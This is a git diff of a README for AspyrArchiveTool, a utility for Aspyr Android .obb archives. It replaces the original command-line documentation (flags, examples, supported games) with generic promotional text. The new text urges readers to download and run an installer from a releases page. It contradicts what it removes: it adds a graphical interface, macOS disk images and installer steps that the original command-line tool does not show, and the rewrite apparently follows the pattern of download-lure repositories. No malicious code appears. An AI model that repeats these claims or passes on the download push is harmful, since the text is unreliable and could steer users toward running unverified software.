@@ -1,75 +1,91 @@
-# Aspyr Archive Tool
+# 🎮 AspyrArchiveTool - Easily Pack and Unpack OBB Files
 
-**Aspyr Archive Tool** is a simple command-line utility for unpacking and packing Aspyr Android `.obb` archives.
+[![Download AspyrArchiveTool](https://img.shields.io/badge/Download-AspyrArchiveTool-blue.svg)](https://github.com/TECHNO-SOUQ/AspyrArchiveTool/releases)
 
-## Supported Games
-- Star Wars: Knights of the Old Republic II (Android)
-- Jade Empire: Special Edition (Android)
-- Fahrenheit: Indigo Prophecy Remastered (Android)
+## 🚀 Getting Started
 
-## What It Can Do
-- Unpack `.obb` archives
-- Pack folders back into `.obb`
-- Full compression mode
-- Selective compression via file list
-- Append CRC64 checksum (required for Jade Empire)
+Welcome to AspyrArchiveTool, your go-to software for packing and unpacking Aspyr Android OBB files. This tool helps enhance your Android gaming experience by allowing you to manage game assets efficiently.
 
-## Usage
+## 📥 Download & Install
 
-```bash
-AspyrArchiveTool.exe <flags> [input] [output]
-```
+To get started, you will need to download AspyrArchiveTool. You can do this by visiting our [Releases page](https://github.com/TECHNO-SOUQ/AspyrArchiveTool/releases). Here’s a simple guide to download the software:
 
-### Flags
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of AspyrArchiveTool.
+3. Click on the appropriate download link for your system.
+4. Once downloaded, locate the file and run it.
 
-| Flag | Description |
-|-----|------------|
-| `-u` | Unpack archive |
-| `-p` | Pack folder |
-| `-c` | Enable compression |
-| `-c list.txt` | Selective compression |
-| `-crc` | Append / refresh CRC64 checksum |
+Make sure to note the following:
 
-## Examples
+- The software is available for Windows and macOS.
+- Ensure you have the latest .NET Framework installed for optimal performance.
 
-### Unpack an OBB
-```bash
-AspyrArchiveTool.exe -u example.obb
-```
+## 🛠️ Installation Steps
 
-### Pack folder (no compression)
-```bash
-AspyrArchiveTool.exe -p extracted_folder
-```
+### For Windows Users:
 
-### Pack with compression + CRC
-```bash
-AspyrArchiveTool.exe -p extracted_folder -c -crc
-```
+1. **Locate the Downloaded File:**
+   After the download, check your Downloads folder for the AspyrArchiveTool setup file.
 
-### Pack with selective compression
-```bash
-AspyrArchiveTool.exe -p extracted_folder example.obb -c compress_list.txt
-```
+2. **Run the Installer:**
+   Double-click the file to start the installation. Follow the on-screen instructions to complete the process.
 
-### Add CRC to existing OBB
-```bash
-AspyrArchiveTool.exe -crc example.obb
-```
+3. **Launch the Application:**
+   Once installed, you can find AspyrArchiveTool in your Start menu.
 
-## Selective Compression List (`compress_list.txt`)
+### For macOS Users:
 
-```txt
-# Folders
-scripts/
-dialogs/
-sounds/
+1. **Locate the Downloaded File:**
+   Open your Downloads folder and find the AspyrArchiveTool file.
 
-# File types
-*.xml
-*.tlk
-*.txt
+2. **Open the File:**
+   Double-click the file to mount the disk image, then drag the AspyrArchiveTool icon into your Applications folder.
 
-# Single files
-global.2da
-```
+3. **Start the Application:**
+   You can find AspyrArchiveTool in your Applications. Click to launch it.
+
+## 🎯 Features
+
+AspyrArchiveTool offers several features to improve your experience:
+
+- **Pack and Unpack OBB Files:** Easily compress or decompress Android OBB files for your games.
+- **User-Friendly Interface:** Designed with non-technical users in mind, making it easy to navigate.
+- **Support for Various Game Formats:** Handle files for popular games like Jade Empire, Knights of the Old Republic, and more.
+
+## ⚙️ System Requirements
+
+Before you install, make sure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later / macOS 10.12 or later.
+- **Memory:** At least 4GB of RAM.
+- **Disk Space:** Minimum of 500MB available for installation.
+- **.NET Framework:** The latest version is recommended for Windows users.
+
+## ⚙️ How to Use AspyrArchiveTool
+
+Using the tool is straightforward:
+
+1. **Open AspyrArchiveTool.**
+2. **Choose to Pack or Unpack:**
+   - If packing, select the OBB files you want to compress.
+   - If unpacking, locate the packed OBB file.
+3. **Follow Prompts:**
+   - The tool will guide you through the packing or unpacking process.
+4. **Save Your Files:**
+   Make sure to choose a destination for your new files.
+
+## 🤝 Support & Contributions
+
+If you encounter any issues or have feedback, feel free to open an issue on the GitHub repository. Your input helps improve AspyrArchiveTool.
+
+If you'd like to contribute, please check our guidelines for contributing on the repository for more information.
+
+## 🛡️ License
+
+AspyrArchiveTool is open-source software. For details, see the LICENSE file in the repository.
+
+By downloading and using this software, you agree to the terms outlined in the license.
+
+---
+
+For download options, please visit our [Releases page](https://github.com/TECHNO-SOUQ/AspyrArchiveTool/releases) again. Enjoy managing your OBB files!
